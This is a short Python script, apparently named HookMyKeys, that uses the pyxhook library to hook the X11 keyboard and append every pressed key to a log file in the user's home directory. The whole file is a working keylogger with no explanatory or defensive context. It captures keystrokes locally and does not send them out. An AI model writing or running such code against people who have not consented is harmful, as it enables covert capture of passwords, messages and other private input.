import pyxhook
import os.path
homedir = os.path.expanduser('~')
log_file=homedir+'/HookMyKeys/HookMyKeys.log' #this is the path of log file

def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
